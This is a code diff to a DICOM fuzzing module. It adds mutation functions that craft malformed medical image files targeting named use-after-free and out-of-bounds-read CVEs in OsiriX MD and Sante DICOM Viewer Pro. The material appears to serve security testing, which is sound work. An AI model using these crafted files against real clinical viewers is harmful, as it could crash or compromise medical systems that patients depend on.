@@ -3,7 +3,7 @@
 Mutation strategies based on known DICOM vulnerabilities and CVEs.
 These target specific vulnerability patterns found in real-world DICOM parsers.
 
-CVEs Covered (20 total mutations across 14 CVEs):
+CVEs Covered (24 total mutations across 18 CVEs):
 
 2025 CVEs:
 - CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
@@ -12,12 +12,16 @@ CVEs Covered (20 total mutations across 14 CVEs):
 - CVE-2025-53618: GDCM JPEG codec out-of-bounds read (info leak)
 - CVE-2025-53619: GDCM JPEG codec out-of-bounds read
 - CVE-2025-1001: RadiAnt DICOM Viewer certificate validation bypass (MITM)
+- CVE-2025-27578: OsiriX MD use-after-free via DICOM upload
+- CVE-2025-31946: OsiriX MD local use-after-free via DICOM import
+- CVE-2025-5307: Sante DICOM Viewer Pro out-of-bounds read
 
 2024 CVEs:
 - CVE-2024-22100: MicroDicom heap-based buffer overflow
 - CVE-2024-25578: MicroDicom out-of-bounds write (lack of validation)
 - CVE-2024-28877: MicroDicom stack-based buffer overflow
 - CVE-2024-33606: MicroDicom URL scheme bypass
+- CVE-2024-1453: Sante DICOM Viewer Pro out-of-bounds read
 
 Legacy CVEs:
 - CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
@@ -26,8 +30,9 @@ Legacy CVEs:
 - CVE-2022-24193: OsiriX denial of service via deep nesting
 
 References:
-- CISA ICS-CERT Medical Advisories (ICSMA-24-060-01, ICSMA-25-037-01,
-  ICSMA-25-051-01, ICSMA-25-160-01, ICSMA-25-345-01)
+- CISA ICS-CERT Medical Advisories (ICSMA-24-058-01, ICSMA-24-060-01,
+  ICSMA-25-037-01, ICSMA-25-051-01, ICSMA-25-128-01, ICSMA-25-160-01,
+  ICSMA-25-345-01)
 - NIST NVD DICOM entries
 - OWASP Medical Device Security
 
@@ -52,6 +57,7 @@ class CVECategory(Enum):
     INTEGER_UNDERFLOW = "integer_underflow"
     OUT_OF_BOUNDS_WRITE = "out_of_bounds_write"
     OUT_OF_BOUNDS_READ = "out_of_bounds_read"
+    USE_AFTER_FREE = "use_after_free"
     PATH_TRAVERSAL = "path_traversal"
     DENIAL_OF_SERVICE = "denial_of_service"
     POLYGLOT = "polyglot"
@@ -903,6 +909,244 @@ def mutate_certificate_validation_bypass(data: bytes) -> bytes:
     return bytes(result)
 
 
+# CVE-2025-27578: OsiriX MD Use-After-Free (Remote)
+# CISA Advisory: ICSMA-25-128-01
+# CVSS: 8.7 (High)
+
+
+def mutate_use_after_free_remote(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-27578 use-after-free.
+
+    OsiriX MD vulnerability:
+    - Use-after-free via crafted DICOM file upload
+    - Causes memory corruption leading to DoS
+    - Could potentially allow code execution
+
+    Attack vector: Malformed sequences with dangling references.
+    """
+    result = bytearray(data)
+
+    # Use-after-free patterns typically triggered by:
+    # 1. Sequences with invalid item counts
+    # 2. References to freed memory regions
+    # 3. Malformed encapsulated data with early termination
+
+    # Create sequence structure that may cause UAF
+    # by having mismatched item counts and early delimitation
+    sq_tag = b"\x08\x00\x15\x11"  # Referenced Series Sequence
+    item_start = b"\xfe\xff\x00\xe0"  # Item
+    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
+    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence Delimitation
+
+    # Create malformed sequence with premature termination
+    # Parser may allocate memory for expected items then free early
+    uaf_sequence = (
+        sq_tag
+        + b"SQ\x00\x00"
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Item 1 - valid
+        + item_start
+        + struct.pack("<I", 8)  # Length 8
+        + b"\x00" * 8
+        # Item 2 - starts but immediately ends sequence
+        + item_start
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Premature sequence end without item end
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+        # More data after sequence end - may reference freed memory
+        + b"\x08\x00\x16\x00"  # (0008,0016) SOP Class UID
+        + b"UI"
+        + struct.pack("<H", 26)
+        + b"1.2.840.10008.5.1.4.1.1.2"
+        + b"\x00"
+    )
+
+    # Also corrupt existing sequences if present
+    idx = data.find(sq_tag)
+    if idx != -1:
+        # Find item delimiter and corrupt it
+        item_idx = result.find(item_end, idx)
+        if item_idx != -1:
+            # Replace item end with garbage to confuse parser
+            result[item_idx : item_idx + 4] = b"\x00\x00\x00\x00"
+
+    # Append UAF-triggering structure
+    result = result[:-4] + uaf_sequence + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2025-31946: OsiriX MD Local Use-After-Free
+# CISA Advisory: ICSMA-25-128-01
+# CVSS: 6.9 (Medium)
+
+
+def mutate_use_after_free_local(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-31946 local use-after-free.
+
+    OsiriX MD vulnerability:
+    - Local use-after-free via crafted DICOM import
+    - Causes memory corruption or system crash
+    - Triggered by specific PixelData/sequence patterns
+
+    Attack vector: Malformed PixelData with dangling frame references.
+    """
+    result = bytearray(data)
+
+    # Local UAF often triggered by:
+    # 1. Multi-frame images with invalid frame pointers
+    # 2. Encapsulated data with freed fragment references
+    # 3. Sequences with circular or self-referencing items
+
+    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010)
+    item_tag = b"\xfe\xff\x00\xe0"
+    seq_delim = b"\xfe\xff\xdd\xe0"
+
+    # Create encapsulated PixelData that may cause UAF
+    # with fragments that reference each other incorrectly
+    uaf_pixel_data = (
+        pixel_data_tag
+        + b"OW\x00\x00"
+        + b"\xff\xff\xff\xff"  # Undefined length
+        # Offset table with invalid offsets pointing to freed regions
+        + item_tag
+        + struct.pack("<I", 16)  # 4 offsets
+        + struct.pack("<I", 0)  # Offset 0 (valid)
+        + struct.pack("<I", 0xFFFFFFFF)  # Invalid offset (may cause UAF)
+        + struct.pack("<I", 0x80000000)  # Large offset
+        + struct.pack("<I", 0xDEADBEEF)  # Marker for debugging
+        # Fragment 0
+        + item_tag
+        + struct.pack("<I", 4)
+        + b"\x00\x00\x00\x00"
+        # Missing fragments - parser may try to access freed memory
+        # Premature end
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
+
+    # Replace existing PixelData or append
+    idx = data.find(pixel_data_tag)
+    if idx != -1:
+        # Corrupt existing PixelData length
+        if idx + 12 < len(result):
+            result[idx + 8 : idx + 12] = b"\xff\xff\xff\xff"
+    else:
+        result = result[:-4] + uaf_pixel_data + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2024-1453: Sante DICOM Viewer Pro Out-of-Bounds Read
+# CISA Advisory: ICSMA-24-058-01
+# CVSS: 7.8 (High)
+
+
+def mutate_oob_read_sante_2024(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-1453 out-of-bounds read.
+
+    Sante DICOM Viewer Pro vulnerability:
+    - Out-of-bounds read via malicious DICOM file
+    - Can disclose information or execute arbitrary code
+    - Affects version 14.0.3 and prior
+
+    Attack vector: Malformed elements with lengths exceeding bounds.
+    """
+    result = bytearray(data)
+
+    # OOB read triggered by:
+    # 1. Element lengths larger than actual data
+    # 2. String elements with missing null terminators
+    # 3. Numeric elements with oversized values
+
+    # Target commonly parsed elements that may cause OOB read
+    oob_targets = [
+        (b"\x08\x00\x60\x00", b"SH", 256),  # (0008,0060) Modality
+        (b"\x08\x00\x70\x00", b"LO", 512),  # (0008,0070) Manufacturer
+        (b"\x10\x00\x10\x00", b"PN", 1024),  # (0010,0010) Patient Name
+        (b"\x10\x00\x20\x00", b"LO", 512),  # (0010,0020) Patient ID
+        (b"\x20\x00\x0d\x00", b"UI", 256),  # (0020,000D) Study Instance UID
+    ]
+
+    tag, vr, length = random.choice(oob_targets)
+    idx = data.find(tag)
+
+    if idx != -1 and idx + 8 < len(result):
+        # Set length larger than remaining file
+        remaining = len(result) - idx - 8
+        oversized_length = remaining + random.randint(100, 1000)
+        result[idx + 6 : idx + 8] = struct.pack("<H", min(oversized_length, 0xFFFF))
+    else:
+        # Inject element with oversized length
+        insert_pos = min(200, len(result) - 4)
+        oversized_element = (
+            tag
+            + vr
+            + struct.pack("<H", length)  # Claim large length
+            + b"X" * min(length // 4, 64)  # But provide less data
+        )
+        result = result[:insert_pos] + oversized_element + result[insert_pos:]
+
+    return bytes(result)
+
+
+# CVE-2025-5307: Sante DICOM Viewer Pro Out-of-Bounds Read (2025)
+# CVSS: 8.4 (High)
+
+
+def mutate_oob_read_sante_2025(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-5307 out-of-bounds read.
+
+    Sante DICOM Viewer Pro vulnerability:
+    - Out-of-bounds read in version 14.2.1 and prior
+    - Can disclose sensitive information
+    - Potentially allows arbitrary code execution
+
+    Attack vector: Malformed pixel data dimensions with undersized buffers.
+    """
+    result = bytearray(data)
+
+    # This CVE is related to pixel data parsing with dimension mismatches
+    # Similar to other OOB reads but with specific trigger patterns
+
+    # Set up dimension/buffer size mismatch
+    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
+    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
+    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
+    bits_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated
+
+    # Set dimensions that will cause read beyond allocated buffer
+    oob_dimensions = [
+        (4096, 4096, 3, 16),  # Large RGB 16-bit
+        (8192, 1, 1, 16),  # Very wide single row
+        (1, 8192, 1, 16),  # Very tall single column
+        (2048, 2048, 4, 8),  # RGBA 8-bit
+    ]
+
+    rows, cols, samples, bits = random.choice(oob_dimensions)
+
+    # Modify dimensions if tags exist
+    for tag, value in [
+        (rows_tag, rows),
+        (cols_tag, cols),
+        (samples_tag, samples),
+        (bits_tag, bits),
+    ]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", value)
+
+    # Set PixelData to small size to trigger OOB read
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 12 < len(result):
+        # Set very small pixel data length
+        result[idx + 8 : idx + 12] = struct.pack("<I", 64)
+
+    return bytes(result)
+
+
 # Registry of all CVE mutations
 
 CVE_MUTATIONS: list[CVEMutation] = [
@@ -1065,6 +1309,42 @@ CVE_MUTATIONS: list[CVEMutation] = [
         mutation_func="mutate_certificate_validation_bypass",
         severity="medium",
         target_component="metadata",
+    ),
+    # CVE-2025-27578: OsiriX MD Use-After-Free (Remote)
+    CVEMutation(
+        cve_id="CVE-2025-27578",
+        category=CVECategory.USE_AFTER_FREE,
+        description="OsiriX MD use-after-free via crafted DICOM upload",
+        mutation_func="mutate_use_after_free_remote",
+        severity="high",
+        target_component="sequence",
+    ),
+    # CVE-2025-31946: OsiriX MD Local Use-After-Free
+    CVEMutation(
+        cve_id="CVE-2025-31946",
+        category=CVECategory.USE_AFTER_FREE,
+        description="OsiriX MD local use-after-free via DICOM import",
+        mutation_func="mutate_use_after_free_local",
+        severity="medium",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-1453: Sante DICOM Viewer Pro Out-of-Bounds Read
+    CVEMutation(
+        cve_id="CVE-2024-1453",
+        category=CVECategory.OUT_OF_BOUNDS_READ,
+        description="Sante DICOM Viewer Pro OOB read via malformed elements",
+        mutation_func="mutate_oob_read_sante_2024",
+        severity="high",
+        target_component="element_length",
+    ),
+    # CVE-2025-5307: Sante DICOM Viewer Pro Out-of-Bounds Read (2025)
+    CVEMutation(
+        cve_id="CVE-2025-5307",
+        category=CVECategory.OUT_OF_BOUNDS_READ,
+        description="Sante DICOM Viewer Pro OOB read via pixel dimension mismatch",
+        mutation_func="mutate_oob_read_sante_2025",
+        severity="high",
+        target_component="pixel_data",
     ),
 ]
 
